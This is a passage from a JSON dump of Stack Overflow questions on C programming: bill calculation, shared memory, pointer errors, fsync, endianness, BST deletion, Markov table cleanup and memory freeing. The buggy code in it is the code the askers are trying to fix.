electric meter readings: \", preElecRead, currElecRead);\n    scanf(\"%ld %ld\", preElecRead, currElecRead);\n    printf(\"Enter previous &amp; current gas meter readings: \", preGasRead, currGasRead);\n    scanf(\"%ld %ld\", preGasRead, currGasRead);\n}\n\ndouble calcOutput( double *kwhConsumed, double *thermsConsumed, double *elecCharges, double *gasCharges, double *totalDue,\n            long preElecRead, long currElecRead, long preGasRead, long currGasRead)\n{\n    *kwhConsumed = calcKWH(preElecRead, currElecRead);\n    *thermsConsumed = calcGasTherms(preGasRead, currGasRead);\n    *elecCharges = calcElecCharges(kwhConsumed);\n    *gasCharges = calcGasCharges(*thermsConsumed);\n    *totalDue =  calcTotalDue(gasCharges, elecCharges);\n}\n\ndouble calcKWH(long preElecRead, long currElecRead)\n{\n    double kwh;\n\n    kwh = (double)currElecRead - (double)preElecRead;\n\n    return kwh;\n}\n\ndouble calcGasTherms(long preGasRead, long currGasRead)\n{\n    double gas;\n\n    gas = (double)currGasRead - (double)preGasRead;\n\n    return gas;\n}\n\ndouble calcElecCharges(double* kwhConSumed)\n{\n    double elecCharge ;\n    if (*kwhConSumed &gt; 0 &amp;&amp; *kwhConSumed &lt;= BASELINE)\n    {\n        elecCharge = *kwhConSumed * CONST1;\n    }\n        else\n            if ( *kwhConSumed &gt; BASELINE &amp;&amp; *kwhConSumed &lt;= (1.3*BASELINE))\n                {\n                    elecCharge = *kwhConSumed * CONST2;\n                }\n                else\n                   if ( *kwhConSumed &gt; (1.3*BASELINE) &amp;&amp; *kwhConSumed &lt;= (2.0*BASELINE))\n                    {\n                        elecCharge = *kwhConSumed *  CONST3;\n                    }\n                        else\n                            if (*kwhConSumed &gt; 2.0*BASELINE)\n                            {\n                                elecCharge = *kwhConSumed * CONST4;\n                            }\n   return  round100th(elecCharge);\n}\ndouble calcGasCharges(double thermsConsumed)\n{\n    double gas;\n    // check if therms &lt; 0 and &lt;= baseline\n    if (thermsConsumed &gt; 0 &amp;&amp; thermsConsumed &lt;= GAS_BASELINE) gas = thermsConsumed * CONST5;\n        else\n            if (thermsConsumed &gt; GAS_BASELINE) gas = thermsConsumed * CONST6;\n    return round100th(gas);\n\n}\n\ndouble round100th(double n)\n{\n    if(n &gt; 0 )\n    {\n        n = (n + 50) / 100 * 100;\n    }\n    else\n    {\n        return n = 0;\n    }\n    return n;\n}\n\ndouble calcTotalDue(double* gasCharges, double* elecCharges)\n{\n    double i;\n\n    i = (double)(*gasCharges)+ (double)(*elecCharges);// calc total\n\n    return i;\n}\n\nvoid printOutput(long preElecRead, long currElecRead, long preGasRead, long currGasRead,double kwhConsumed, double thermsConsumed,\n             double elecCharges, double gasCharges, double totalDue )\n{\n    printf(\"Electric:\\n\");\n    printf(\"Previous: %ld, Current: %ld,     KWH Used: %0.0lf, Charges: %.2lf\\n\", preElecRead, currElecRead, kwhConsumed, elecCharges);\n\n    printf(\"Gas:\\n\");\n    printf(\"Previous: %ld, Current: %ld,  Therms Used: %0.0lf, Charges: %.2lf\\n\", preGasRead, currGasRead, thermsConsumed, gasCharges);\n\n   printf(\"Total Charges: %60.2lf\", totalDue);\n}\n</code></pre>\n\n<p>hi I have a problem with this code i finish the code but somehow my out put for electric charge and and gas charge is different from the test run output used by my professor, I'm thinking that I might not have been using the right formula to calculate gas charge and electric charge. Can anyone show me the right formula to calculate gas charge and electric charge</p>\n\n<p>this is my output</p>\n\n<pre><code>Enter previous &amp; current electric meter readings: 80000\n80500\nEnter previous &amp; current gas meter readings: 990\n1030\nElectric:\nPrevious: 80000, Current: 80500,     KWH Used: 500, Charges: 210.73\nGas:\nPrevious: 990, Current: 1030,  Therms Used: 40, Charges: 104.14\nTotal Charges:                                                       314.87\nProcess returned 0 (0x0)   execution time : 21.512 s\nPress any key to continue.\n</code></pre>\n\n<p>this is the test run output:</p>\n\n<pre><code>Enter previous &amp; current electric meter readings: 80000\n80500\nEnter previous &amp; current gas meter readings: 990\n1030\nElectric:\nPrevious: 80000, Current: 80500,     KWH Used: 500, Charges: 135.78\nGas:\nPrevious: 990, Current: 1030,  Therms Used: 40, Charges: 135.78\nTotal Charges:                                                       271.56\n</code></pre>\n\n<p>As you can see  the outputs for gas charge and electric charge are different in both using the same input. How can I fix this ? \nThank you in advance.</p>\n"},{"tags":["c","unix","shared-memory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13234990,"title":"Unix Programming Shared Memory strange results","body":"<p>I have been working on semaphores and shared memory for a week now, and have some difficulties yet,so i tried to make this program which the children are supposed to write to a memory shared multidimensional integer array and the father is suppose to read that array from the memory that is shared.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/ipc.h&gt; \n#include &lt;sys/shm.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/fcntl.h&gt;\n#include &lt;semaphore.h&gt;\n#include &lt;sys/wait.h&gt;\n\n#define MAXCHILDS 1\n#define MAX_SIZE 10\n#define MAX_WRITES 100\n\ntypedef struct{\n    int m[MAX_SIZE][MAX_SIZE];\n}matrix;\n\n\n/*fork variables*/\npid_t child[MAXCHILDS];\n/*semphores variables */\nsem_t *empty, *full, * mutex;\n/*share memory id*/\nint shmid;\n/*shared memory array pointer */\nmatrix * sh_mem;\n\n\n\n\nvoid init(){\n\n     /*semaphores unlink and creation */    \n     sem_unlink(\"EMPTY\");\n     empty=sem_open(\"EMPTY\",O_CREAT|O_EXCL,0700,50);\n     sem_unlink(\"FULL\");\n     full=sem_open(\"FULL\",O_CREAT|O_EXCL,0700,0);\n     sem_unlink(\"MUTEX\");\n     mutex=sem_open(\"MUTEX\",O_CREAT|O_EXCL,0700,1);\n    /*initialize shared memory */\n    shmid = shmget(IPC_PRIVATE,sizeof(matrix),IPC_CREAT|0777);\n    /*map shared memory*/\n    sh_mem = (matrix*)shmat(shmid,NULL,0);\n    if(sh_mem == (matrix*)(-1)){\n        perror(\"shmat\");\n    }\n}\n\nvoid writer(int m[MAX_SIZE][MAX_SIZE],int n_child){\n    int i,k;\n    for(i = 0;i&lt;MAX_SIZE;i++){\n        for(k= 0;k&lt;MAX_SIZE;k++){\n            m[i][k] = 0;\n            if(i==(k+1)){\n                m[i][k] = 1;\n            }\n        }\n    }\n\n}\nvoid reader(int m[MAX_SIZE][MAX_SIZE]){\n    int i = 0;\n    int k = 0;\n    int sum = 0;\n    for(i = 0;i&lt;MAX_SIZE;i++){\n        for(k= 0;k&lt;MAX_SIZE;k++){\n            printf(\"%d\",m[k][i]);\n        }\n        sum++;\n        printf(\"[i=]%d[k=]%d\\n\",i,k);\n    }\n    printf(\"%d\",sum);\n\n}\n\nvoid terminate() {\n  sem_close(empty);\n  sem_close(full);\n  sem_close(mutex);\n  sem_unlink(\"EMPTY\");\n  sem_unlink(\"FULL\");\n  sem_unlink(\"MUTEX\");\n  shmctl(shmid, IPC_RMID, NULL);\n}\n\nint main(int argc, char **argv)\n{\n    int i,sum;\n    init();\n\n    for(i = 0;i&lt;MAXCHILDS;i++){\n        if((child[i]= fork()) &lt; 0) // error occured\n        {\n            perror(\"Fork Failed\");\n            exit(1);\n        }\n        if((child[i] =fork())==0){\n            writer(sh_mem-&gt;m,i);\n            exit(0);\n        }\n    }\n\n    /*father*/\n    sleep(10);\n    sum++;\n    printf(\"%d\\n\",sum); \n    reader(sh_mem-&gt;m);\n    wait(NULL);\n\n    terminate();\n\n\n    return 0;\n}\n</code></pre>\n\n<p>I have two problems right now ... I need to save the array to a memory mapped file which i dont seem to understand and the output of the father is throwing is very strange ...His output is </p>\n\n<pre><code>0000100000[i=]3[k=]10\n0000010000[i=]4[k=]10\n0000001000[i=]5[k=]10\n0100000000[i=]0[k=]10\n0000000100[i=]6[k=]10\n0010000000[i=]1[k=]10\n0000000010[i=]7[k=]10\n0001000000[i=]2[k=]10\n0000000001[i=]8[k=]10\n0000100000[i=]3[k=]10\n0000000000[i=]9[k=]10\n0000010000[i=]4[k=]10\n0000001000[i=]5[k=]10\n0000000100[i=]6[k=]10\n0000000010[i=]7[k=]10\n0000000001[i=]8[k=]10\n0000000000[i=]9[k=]10\n</code></pre>\n\n<p>And it should be something like this:</p>\n\n<pre><code>0000100000[i=]0[k=]10\n0000010000[i=]1[k=]10\n0000001000[i=]2[k=]10\n0100000000[i=]3[k=]10\n0000000100[i=]4[k=]10\n0010000000[i=]5[k=]10\n0000000010[i=]6[k=]10\n0001000000[i=]7[k=]10\n0000000001[i=]8[k=]10\n0000100000[i=]9[k=]10\n</code></pre>\n"},{"tags":["c","pointers","gcc","compiler-errors","dereference"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":56,"score":3,"question_id":13215133,"title":"Unable to locate source of \"dereferencing pointer to incomplete type\" error","body":"<p>As part of an assignment I'm doing for a university course, I need to write a CPU scheduling simulator in C (not C++). I'm hitting an issue when compiling with GCC where it's giving me several errors about \"dereferencing pointer to incomplete type\". All the errors are a result of the same code, which makes me think there's an issue with that code.</p>\n\n<p>The offending code is:</p>\n\n<pre><code>//Push a record of this state change to the back of the simulation's history list\nlistPushBack(sim-&gt;history, (void*)newRecord(p-&gt;pid, sim-&gt;currentTime, wait, ready));\n</code></pre>\n\n<p>This is related to keeping track of the history of the simulation for analysis later on. A record is defined as:</p>\n\n<pre><code>//History.h\n\ntypedef struct record* Record;\n\n//History.c\n\ntypedef struct record recordType;\n\nstruct record{\n    long time;\n    int pid;\n    State oldState;\n    State newState;\n};\n\nRecord newRecord(int pid, long time, ProcessState oldState, ProcessState newState){\n    Record r = (Record)malloc(sizeof(recordType));\n    if(r == NULL){\n        fprintf(stderr, \"History.c:newRecord:Failed to allocate memory for new Record\\n\");\n        //This is serious, abort execution\n        exit(-1)\n    }\n    r-&gt;time = time;\n    r-&gt;pid = pid;\n    r-&gt;oldState = oldState;\n    r-&gt;newState = newState;\n    return r;\n}\n</code></pre>\n\n<p>where ProcessState is defined as:</p>\n\n<pre><code>//Process.h\n\ntypedef enum process_state ProcessState;\n\nenum process_state{\n    arrive = 0,\n    ready = 1,\n    run = 2,\n    wait = 3,\n    done = 4\n};\n</code></pre>\n\n<p>I played around and got the same error with this:</p>\n\n<pre><code>Process p = (Process)listGetAt(sim-&gt;waitingQueue, i);\nProcessState old = p-&gt;state;\nlistPushBack(sim-&gt;history, (void*)newRecord(p-&gt;pid, sim-&gt;currentTime, old, p-&gt;state));\n</code></pre>\n\n<p>Thankfully, this isn't due for another week, so I've got time to play around, but I'm hoping someone can point me in the right direction before I waste too much time messing with things.</p>\n\n<p>EDIT: Answering questions in order of appearance in comments,</p>\n\n<pre><code>//DoubleLinkList.c\n\nbool listPushBack(DoubleList l, void* data){\n    return listInsert(l, data, -1);\n}\nbool listInsert(DoubleList l, void* data, int pos){\n    int index = pos;\n    //If value is negative, convert to a index relative to the end of the list\n    if(index &lt; 0){\n        index = listSize(l) + index + 1;\n    }\n    //Check index bounds\n    if(index &gt; listSize(l) || index &lt; 0){\n        fprintf(stderr, \"DoubleLinkList.c:listInsert:Insert index %i out of bounds\\n\", pos);\n        //This is not serious enough to warrent an abort\n        return false;\n    }\n    //Data is null\n    if(data == NULL){\n        fprintf(stderr, \"DoubleLinkList.c:listInsert:Data value for doubly linked list node cannot be NULL\\n\");\n        //This is not serious enough to warrent an abort\n        return false;\n    }\n    Node insertNode = newNode(data);\n    //Case: End of list\n    if(index == listSize(l)){\n        l-&gt;tail-&gt;next = insertNode;\n        insertNode-&gt;prev = l-&gt;tail;\n        l-&gt;tail = insertNode;\n        l-&gt;size++;\n        return true;\n    }\n    //Case: Start of list\n    else if(index == 0){\n        l-&gt;head-&gt;prev = insertNode;\n        insertNode-&gt;next = l-&gt;head;\n        l-&gt;head = insertNode;\n        l-&gt;size++;\n        return true;\n    }\n    //Case: Middle of list\n    Node node = l-&gt;head;\n    //Scan through list to reach index pos\n    int i;\n    for(i = 0; i &lt; index; i++){\n        if(node == NULL){\n            fprintf(stderr, \"DoubleLinkList.c:listGetPosition:NULL encoutered unexpectedly while traversing doubly linked list at index %i\\n\", i);\n            //This is a serious problem, abort execution\n            exit(-1);\n        }\n        node = node-&gt;next;\n    }\n    //Insert before Node at index pos\n    insertNode-&gt;next = node;\n    insertNode-&gt;prev = node-&gt;prev;\n    node-&gt;prev-&gt;next = insertNode;\n    node-&gt;prev = insertNode;\n    l-&gt;size++;\n    return true;\n}\n</code></pre>\n\n<p>Yes, Process is:</p>\n\n<pre><code>typedef process_Struct* Process\n</code></pre>\n\n<p>Simulation declaration:</p>\n\n<pre><code>//Simulation.c\nstruct simulation{\n    SimType type;\n    long currentTime;\n    unsigned int totalProcesses;\n    DoubleList arriveQueue;\n    DoubleList readyQueue;\n    DoubleList waitingQueue;\n    DoubleList doneQueue;\n    Process running;\n    DoubleList history;\n};\n</code></pre>\n\n<p>The method that is throwing issues is runSimulation(Simulation sim) where:</p>\n\n<pre><code>typedef simulation* Simulation;\n</code></pre>\n\n<p>runSimulation is declared in Simulation.c</p>\n\n<p>The exact error message is: source/Simulation.c:154:50: error: dereferencing pointer to incomplete type\nThat's why this is proving so annoying, it doesn't give any more information then that, even with -verbose, -g, and some of the other debug flags.</p>\n\n<p>I realize I shouldn't typdef pointers, but, stupidly enough, the professor made it a requirement of the assignment. To quote:\n\"When possible, use typedef to define pointers to structs. This is so the TAs have an easier time reading your simulation code.\"\nI'm extremely annoyed by this because it's an awful idea and the TAs should be able to read code.</p>\n"},{"tags":["c","char","ascii"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2876,"score":2,"question_id":1616706,"title":"How to get character's position in alphabet in C language?","body":"<p>Is there a quick way to retrieve given character's position in the english alphabet in C?</p>\n\n<p>Something like: </p>\n\n<pre><code>int position = get_position('g');\n</code></pre>\n"},{"tags":["c","file-io","io","posix","storage"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13201808,"title":"POSIX guaranteeing write to disk","body":"<p>As I understand it, if I want to synchronise data to the storage device I can use fsync() to supposedly flush all the OS output caches... but apparently it doesn't guarantee this at all, unlike the documentation tries to deceive you, and the data may not be written to the disk!</p>\n\n<p>This is not very good for many purposes because it can lead to data corruption. How do I use the POSIX libraries (In a portable way if possible) to guarantee that the data has been written (as far as possible) and prevent data corruption?</p>\n\n<p>There is fdatasync() but it is not implemented on OSX, so is there a better and more portable way, or does one have to implement different code on different systems? I'm also not sure if fdatasync() is good enough.</p>\n\n<p>Of-course, in the worst case scenario I could forget about this and use a redundant database library that uses ACID to store the data. I don't want that.</p>\n\n<p>Also I'm interested in how to ensure truncate and rename operations have definitely completed.</p>\n\n<p>Thanks!</p>\n"},{"tags":["c","hex","octal"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":552,"score":4,"question_id":1835465,"title":"Where did the octal/hex notations come from?","body":"<p>After all of this time, I've never thought to ask this question; I understand this came from c++, but what was the reasoning behind it:</p>\n\n<ul>\n<li>Specify decimal numbers as you\nnormally would</li>\n<li>Specify octal numbers by a leading 0</li>\n<li>Specify hexadecimal numbers by a leading 0x</li>\n</ul>\n\n<p>Why 0?  Why 0x?  Is there a natural progression for base-32?</p>\n"},{"tags":["c","validation","file-io","scanf"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":35,"score":3,"question_id":13234535,"title":"Is there an easy way to read unverified decimal values from a file?","body":"<p>Let's say I have a file of decimal numbers which <em>should</em> be values that can fit in an <code>int</code>, but I want to programmatically verify the content of this file to check for overflows. Is there an easy way to check if any of the numbers will over flow an integer? </p>\n\n<p>Ex. file - </p>\n\n<pre><code>name:  test.txt\nvalue: 4343214321423142314\n</code></pre>\n\n<p>If I were to loop and do <code>fscanf(fd, \"%d\", &amp;myint)</code> we would return a successful indication but the number stored in myint would be incorrect. </p>\n\n<p>Likewise if I were to read it in to a character array <code>fscanf(fd, \"%s\", &amp;mystr)</code> and blindly call <code>atoi(mystr)</code> it would return success but with an incorrect result. </p>\n\n<p>Given the second example of reading it into a string it would be possible to do something like:</p>\n\n<pre><code>char buf[11] = {'\\0'};\nsprintf(buf, \"%d\", INT_MAX);\n\nfscanf(fd, \"%s\", &amp;mystr); \nif(strcmp(mystr, buf) &gt; 0)\n    // handle error case\n</code></pre>\n\n<p>but is there an easier way to do this without needing the extra array and string compare function?</p>\n"},{"tags":["c","io","microcontroller"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13234311,"title":"What is IOSET and how works the simple buzzer (BUZZER_PIN)?","body":"<p>I have the c code for the micro-controller with buzzer. It works, but I wonder how it works.\nIn wh.h/.cpp I have the function:</p>\n\n<pre><code>void setBuzzer(tBool on)\n{\n  if (TRUE == on)\n    IOCLR = BUZZER_PIN;\n  else\n    IOSET = BUZZER_PIN;\n}\n</code></pre>\n\n<p>That can enable and disable the buzzer. I don't know what it really makes and what BUZZER_PIN, IOCLR and IOSET are?</p>\n\n<p>The BUZZER_PIN occurs only once more in the code, in:</p>\n\n<pre><code>void immediateIoInit(void)\n{\n  tU8 initCommand[] = {0x12, 0x97, 0x80, 0x00, 0x40, 0x00, 0x14, 0x00, 0x00};\n  //                                                         04 = LCD_RST# low\n  //                                                         10 = BT_RST# low\n\n  //make all key signals as inputs\n  IODIR &amp;= ~(KEYPIN_CENTER | KEYPIN_UP | KEYPIN_DOWN | KEYPIN_LEFT | KEYPIN_RIGHT);\n\n  IODIR |= BUZZER_PIN;\n  IOSET  = BUZZER_PIN;\n\n  IODIR |= BACKLIGHT_PIN;\n  IOSET  = BACKLIGHT_PIN;\n</code></pre>\n\n<p>It looks strange to me, because the IOSET value is changing just after setting it to BUZZER_PIN. So, what it can that way does?</p>\n\n<p>One more question: can I do something more with buzzer? E.g. change to volume? Of course, the duration of sound can be adjusted with setBuzzer(1) than pause(time) and setBuzzer(0).</p>\n"},{"tags":["c","pointers","free","markov-chains"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":13221127,"title":"Markov Clean Function Trouble","body":"<p>I am trying to write a function to clean up the hash table that is generated by this code</p>\n\n<pre><code>/*\n* Markov chain random text generator.\n*/\n\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n#include \"eprintf.h\"\n\nenum {\nNPREF   = 2,    /* number of prefix words */\nNHASH   = 4093, /* size of state hash table array */\nMAXGEN  = 10000 /* maximum words generated */\n};\n\ntypedef struct State State;\ntypedef struct Suffix Suffix;\n\nstruct State {  /* prefix + suffix list */\nchar*   pref[NPREF];    /* prefix words */\nSuffix* suf;            /* list of suffixes */\nState*  next;           /* next in hash table */\n};\n\nstruct Suffix { /* list of suffixes */\nchar*   word;           /* suffix */\nSuffix* next;           /* next in list of suffixes */\n};\n\nState* lookup(char *prefix[], int create);\nvoid build(char *prefix[], FILE*);\nvoid generate(int nwords);\nvoid add(char *prefix[], char *word);\n\nState* statetab[NHASH]; /* hash table of states */\n\nchar NONWORD[] = \"\\n\";  /* cannot appear as real word */\n\n/* markov main: markov-chain random text generation */\nint main(void)\n{\nint i, nwords = MAXGEN;\nchar *prefix[NPREF];        /* current input prefix */\n\nint c;\nlong seed;\n\nsetProgName(\"markov\");\nseed = time(NULL);\n\nsrand(seed);\nfor (i = 0; i &lt; NPREF; i++) /* set up initial prefix */\n    prefix[i] = NONWORD;\nbuild(prefix, stdin);\nadd(prefix, NONWORD);\ngenerate(nwords);\nreturn 0;\n}\n\nconst int MULTIPLIER = 31;  /* for hash() */\n\n/* hash: compute hash value for array of NPREF strings */\nunsigned int hash(char* s[NPREF])\n{\nunsigned int h;\nunsigned char *p;\nint i;\n\nh = 0;\nfor (i = 0; i &lt; NPREF; i++)\n    for (p = (unsigned char *) s[i]; *p != '\\0'; p++)\n        h = MULTIPLIER * h + *p;\nreturn h % NHASH;\n}\n\n\n/* lookup: search for prefix; create if requested. */\n/*  returns pointer if present or created; NULL if not. */\n/*  creation doesn't strdup so strings mustn't change later. */\nState* lookup(char *prefix[NPREF], int create)\n{\nint i, h;\nState *sp;\n\nh = hash(prefix);\nfor (sp = statetab[h]; sp != NULL; sp = sp-&gt;next) {\n    for (i = 0; i &lt; NPREF; i++)\n        if (strcmp(prefix[i], sp-&gt;pref[i]) != 0)\n            break;\n    if (i == NPREF)     /* found it */\n        return sp;\n}\nif (create) {\n    sp = (State *) emalloc(sizeof(State));\n    for (i = 0; i &lt; NPREF; i++)\n        sp-&gt;pref[i] = prefix[i];\n    sp-&gt;suf = NULL;\n    sp-&gt;next = statetab[h];\n    statetab[h] = sp;\n}\nreturn sp;\n}\n\n/* addsuffix: add to state. suffix must not change later */\nvoid addsuffix(State *sp, char *suffix)\n{\nSuffix *suf;\n\nsuf = (Suffix *) emalloc(sizeof(Suffix));\nsuf-&gt;word = suffix;\nsuf-&gt;next = sp-&gt;suf;\nsp-&gt;suf = suf;\n}\n\n/* add: add word to suffix list, update prefix */\nvoid add(char *prefix[NPREF], char *suffix)\n{\nState *sp;\n\nsp = lookup(prefix, 1);  /* create if not found */\naddsuffix(sp, suffix);\n/* move the words down the prefix */\nmemmove(prefix, prefix+1, (NPREF-1)*sizeof(prefix[0]));\nprefix[NPREF-1] = suffix;\n}\n\n/* build: read input, build prefix table */\nvoid build(char *prefix[NPREF], FILE *f)\n{\nchar buf[100], fmt[10];\n\n/* create a format string; %s could overflow buf */\nsprintf(fmt, \"%%%ds\", sizeof(buf)-1);\nwhile (fscanf(f, fmt, buf) != EOF)\n    add(prefix, estrdup(buf));\n}\n\n/* generate: produce output, one word per line */\nvoid generate(int nwords)\n{\nState *sp;\nSuffix *suf;\nchar *prefix[NPREF], *w;\nint i, nmatch;\n\nfor (i = 0; i &lt; NPREF; i++) /* reset initial prefix */\n    prefix[i] = NONWORD;\n\nfor (i = 0; i &lt; nwords; i++) {\n    sp = lookup(prefix, 0);\n    if (sp == NULL)\n        eprintf(\"internal error: lookup failed\");\n    nmatch = 0;\n    for (suf = sp-&gt;suf; suf != NULL; suf = suf-&gt;next)\n        if (rand() % ++nmatch == 0) /* prob = 1/nmatch */\n            w = suf-&gt;word;\n    if (nmatch == 0)\n        eprintf(\"internal error: no suffix %d %s\", i, prefix[0]);\n    if (strcmp(w, NONWORD) == 0)\n        break;\n    printf(\"%s\\n\", w);\n    memmove(prefix, prefix+1, (NPREF-1)*sizeof(prefix[0]));\n    prefix[NPREF-1] = w;\n}\n}\n</code></pre>\n\n<p>Here is what I have so far for my clean function</p>\n\n<pre><code>/*Clean Function*/\nvoid clean_up(State *sp)\n{\nState *temp;\nSuffix *temp2, temp3;\n\nfor(int h = 0; h &lt; NHASH; h++)\n{\n    for (sp = statetab[h]; sp != NULL; sp = sp-&gt;next)\n    {\n        while(sp-&gt;suf != NULL) \n        {\n            temp2= sp-&gt;suf;\n            temp3= *temp2-&gt;next;\n            free(temp2);\n            sp-&gt;suf= &amp;temp3;\n        }\n\n    }\n}\n}\n</code></pre>\n\n<p>I think im on the right track, I'm going through each index in the hash table, then going from state to state and freeing the suffixes. I'm not sure what to do about the prefixes, because I have to free them before I can free each state. Any help would be greatly appreciated.</p>\n"},{"tags":["c","linux","endianness"],"answer_count":9,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3037,"score":3,"question_id":874617,"title":"Supporting byte ordering in Linux user space","body":"<p>I'm writing a program on Linux in C to analyze core files produced from an embedded system. The core files might be little endian (ARM) or big endian (MIPS), and the program to analyze them might be running on a little endian host (x86) or big endian (PowerPC).</p>\n\n<p>By looking at the headers I know whether the core is LE or BE. I'd rather my program <em>not</em> need to know whether the host it runs on is little or big endian, I'd like to use an API to handle it for me. If there is no better option, I guess I'll start relying on #ifdef __BIG_ENDIAN__.</p>\n\n<p>In the Linux kernel we have cpu_to_le32 et al to convert from native byte ordering to little endian, etc. In user space there is htonl et al, which convert from native to big endian but no equivalent for native to little endian that I can find.</p>\n\n<p>Can anyone suggest a suitable API for user space?</p>\n\n<p><b>Edit</b>: Just to be clear, I'm looking for an API which already knows whether my CPU is big or little endian and swaps byes accordingly. I don't want to have to litter my code with #ifdefs for this. I'm not just looking for code snippets to swap bytes; thank you for those, but that wasn't the point.</p>\n"},{"tags":["c"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":135,"score":0,"question_id":13232784,"title":"Why does main() not need a return statement?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/276807/return-0-implicit\">return 0 implicit</a><br>\n  <a href=\"http://stackoverflow.com/questions/4138649/why-is-return-0-optional\">Why is return 0 optional?</a>  </p>\n</blockquote>\n\n\n\n<p>why does the main() function in C can terminate correctly even without using <code>exit</code> or <code>return</code>?</p>\n\n<p>for example:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint sum(int a,int b)\n{\n return (a + b);\n}\n\nint main()\n{\n int a=10;\n int b=5;\n int ans;    \n ans=sum(a,b);\n printf(\"sum is %d\",ans);\n}\n</code></pre>\n"},{"tags":["c","delete","nodes","binary-search-tree"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13228565,"title":"Binary search tree node deletion","body":"<p>I am implementing a function for the node removal from the binary search tree.\nThe prototype of the function is set and I can't change it, it is a school assignment.\nMy code:</p>\n\n<pre><code>typedef struct tBSTNode {\n    char Key;                                                                 \n    struct tBSTNode * LPtr;                                \n    struct tBSTNode * RPtr;  \n} *tBSTNodePtr; \n\nvoid BSTDelete (tBSTNodePtr *RootPtr, char K) {\n  tBSTNodePtr *tmp;\n\n  if (*RootPtr != NULL) {\n    if (K &lt; (*RootPtr)-&gt;Key)\n        BSTDelete(&amp;(* RootPtr)-&gt;LPtr, K);\n    else if (K &gt; (*RootPtr)-&gt;Key)\n        BSTDelete(&amp;(* RootPtr)-&gt;RPtr, K);\n    else {\n            if ((* RootPtr)-&gt;LPtr == NULL) {\n                /* there is only right branch or none*/\n                tmp = RootPtr;\n                *RootPtr = (* RootPtr)-&gt;RPtr;\n                free(*tmp);\n                *tmp = NULL;\n            }\n            else if ((* RootPtr)-&gt;RPtr == NULL) {\n                /* there is only left branch or none*/\n                tmp = RootPtr;\n                *RootPtr = (* RootPtr)-&gt;LPtr;\n                free(*tmp);\n                *tmp = NULL;\n            }\n            else\n                /* there are both branches, but that is for another topic*/\n        }\n    }\n}  \n</code></pre>\n\n<p>This code works correctly just in case when there are no branches connected to the node I am deleting. I expect that there is a problem with <strong>*tmp = NULL;</strong> line and I am losing my address to the rest of the branch but on the other hand if this line isn't included I am getting a SEGFAULT and I am trying to figure out why.</p>\n\n<p>EDIT:</p>\n\n<p>ok, now I know where the mistake was. It is stupid mistake, I should have used <strong>tBSTNodePtr tmp;</strong> instead of <strong>tBSTNodePtr *tmp;</strong></p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":115,"score":3,"question_id":13230253,"title":"How do I parse a string in C?","body":"<p>I am a beginner learning C; so, please go easy on me. :)</p>\n\n<p>I am trying to write a very simple program that takes each word of a string into a \"Hi (input)!\" sentence (it assumes you type in names). Also, I am using arrays because I need to practice them. </p>\n\n<p>My problem is that, some garbage gets putten into the arrays somewhere, and it messes up the program. I tried to figure out the problem but to no avail; so, it is time to ask for expert help. Where have I made mistakes?</p>\n\n<p>p.s.: It also has an infinite loop somewhere, but it is probably the result of the garbage that is put into the array.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define MAX 500 //Maximum Array size.\n\nint main(int argc, const char * argv[])\n{\n    int stringArray [MAX];\n    int wordArray [MAX];\n    int counter = 0;\n    int wordCounter = 0;\n\n    printf(\"Please type in a list of names then hit ENTER:\\n\");  \n    // Fill up the stringArray with user input.\n    stringArray[counter] = getchar();\n    while (stringArray[counter] != '\\n') {\n        stringArray[++counter] = getchar();\n    }\n\n    // Main function.\n    counter = 0;\n    while (stringArray[wordCounter] != '\\n') {     \n        // Puts first word into temporary wordArray.\n        while ((stringArray[wordCounter] != ' ') &amp;&amp; (stringArray[wordCounter] != '\\n')) {\n            wordArray[counter++] = stringArray[wordCounter++];\n        }\n        wordArray[counter] = '\\0';\n\n        //Prints out the content of wordArray.\n        counter = 0;\n        printf(\"Hi \");\n        while (wordArray[counter] != '\\0') {\n            putchar(wordArray[counter]);\n            counter++;\n        }\n        printf(\"!\\n\");\n\n        //Clears temporary wordArray for new use.\n        for (counter = 0; counter == MAX; counter++) {\n            wordArray[counter] = '\\0';\n        } \n        wordCounter++;\n        counter = 0; \n    }\n    return 0;\n}\n</code></pre>\n\n<p>Solved it! I needed to add to following if sentence to the end when I incremented the wordCounter. :)</p>\n\n<pre><code>    if (stringArray[wordCounter] != '\\n') {\n            wordCounter++;\n    }\n</code></pre>\n"},{"tags":["c","linux","multithreading","pthreads"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":102,"score":1,"question_id":13232119,"title":"Memory usage doesn't decrease when free() used","body":"<p>I am writing OS independent lockless queue, so far it works great, but there is small problem with memory managment. I am not sure if its gcc problem or mine. Problem: Memory increases when element is added to list, but when element is removed from list (free(elementPointer);) memory usage don't change. </p>\n\n<p>BUT when I use pthreads, N producers and M consumers  <code>(1&lt;N&lt;20, 1&lt;M&lt;20)</code> memory usage is about ~10mb all the time (when trying to add and remove ~10kk elements), so looks like free is working.</p>\n\n<p>And funny thing is that in VS 2010 (same code, no threads) free works fine, memory is released (watched task 